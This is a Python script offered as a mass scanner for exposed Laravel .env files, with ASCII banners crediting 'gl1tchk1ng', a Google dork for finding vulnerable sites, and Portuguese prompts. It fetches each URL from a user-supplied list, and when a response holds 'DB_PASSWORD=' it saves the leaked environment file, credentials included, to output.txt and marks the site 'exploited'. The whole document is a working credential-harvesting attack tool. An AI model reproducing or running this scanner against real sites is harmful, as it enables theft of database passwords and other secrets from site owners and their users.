import requests as mr
import os.path
import os


if os.path.exists('output.txt'):
    bk = 'seu merda'
else:
    fh = open('output.txt', "w")


expltd_count = int(0)
nexpltd_count = int(0)

tstbanner = """\033[35m               =========================\033[36m
               \033[35m|\033[36m    .env mass can      |
               |       gl1tchk1ng      |
               |   greetz \033[35myunkerscrew  |
               ========================="""


banner = """\033[36m /$$                                                         /$$
| $$                                                        | $$
| $$        /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$   /$$$$$$ | $$
| $$       |____  $$|  $$  /$$/|____  $$ /$$__  $$ /$$__  $$| $$
| $$        /$$$$$$$ \  $$/$$/  /$$$$$$$| $$  \__/| $$$$$$$$| $$
| $$       /$$__  $$  \  $$$/  /$$__  $$| $$      | $$_____/| $$
| $$$$$$$$|  $$$$$$$   \  $/  |  $$$$$$$| $$      |  $$$$$$$| $$         by gl1tchk1ng
|________/ \_______/    \_/    \_______/|__/       \_______/|__/
                                                                        dork => ext:env intext:"# app_env" -git
  greetz yunkerscrew                                                              
                                                                          .env mass scan
 /$$$$$$$$                     /$$           /$$   /$$                     
| $$_____/                    | $$          |__/  | $$          
| $$       /$$   /$$  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$        
| $$$$$   |  $$ /$$/ /$$__  $$| $$ /$$__  $$| $$|_  $$_/                   24/11/2017
| $$__/    \  $$$$/ | $$  \ $$| $$| $$  \ $$| $$  | $$          
| $$        >$$  $$ | $$  | $$| $$| $$  | $$| $$  | $$ /$$      
| $$$$$$$$ /$$/\  $$| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/      
|________/|__/  \__/| $$____/ |__/ \______/ |__/   \___/        
                    | $$                                        
                    | $$                                        
                    |__/                                        \n\033[0;0m"""


print(banner)

print(tstbanner)
lista = str(input("""\033[36m
[+] \033[35mLista de URLs =>: \033[0;0m"""))

lista = open(lista , 'r').readlines()
lista = [linha.replace('\n' , '') for linha in lista]



for linha in lista:

  req =  mr.get(linha).text
  if 'DB_PASSWORD=' in req:
    print('\033[35mAlvo {} \033[36mExploited <(*-*<)\033[0;0m \n'.format(linha))
    openout = open('output.txt' , 'a')
    openout.write('{} || \n {}\n'.format(linha,req))

   # print('\033[32m{}\033[0;0m'.format(req))
    expltd_count = expltd_count + 1
  else:
    nexpltd_count = nexpltd_count + 1
    print('\033[35mAlvo {} Não vulneravel. \n\033[0;0m'.format(linha))

print('{} \033[36mAlvos exploitado(s) \033[0;0m|| {} \033[35mNão vulneravel(is) \033[0;0m|| gl1tchk1ng'.format(expltd_count,nexpltd_count))
